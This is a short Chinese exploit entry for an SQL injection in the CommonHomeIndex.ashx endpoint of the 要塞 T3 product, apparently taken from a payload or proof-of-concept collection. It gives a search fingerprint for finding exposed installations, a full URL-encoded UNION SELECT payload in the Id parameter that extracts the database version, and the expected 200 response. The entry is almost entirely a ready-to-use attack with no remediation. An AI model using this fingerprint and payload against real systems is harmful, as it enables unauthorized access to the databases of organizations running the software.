# 要塞T3CommonHomeIndex存在SQL注入漏洞

要塞 ｜ SQL注入 ｜ —
- **指纹**：`body="/mlogin.htm?url="`

**Payload**
```
[http://IP](http://IP)/ｆｒａｍｅ/CommonHomeIndex.ashx?action=getdeptpersonList&Id=%27%20UNION%20ALL%20SELECT%20NULL%2C%40%40version%2CNULL%2CNULL%2CNULL--
```
- **响应特征**：200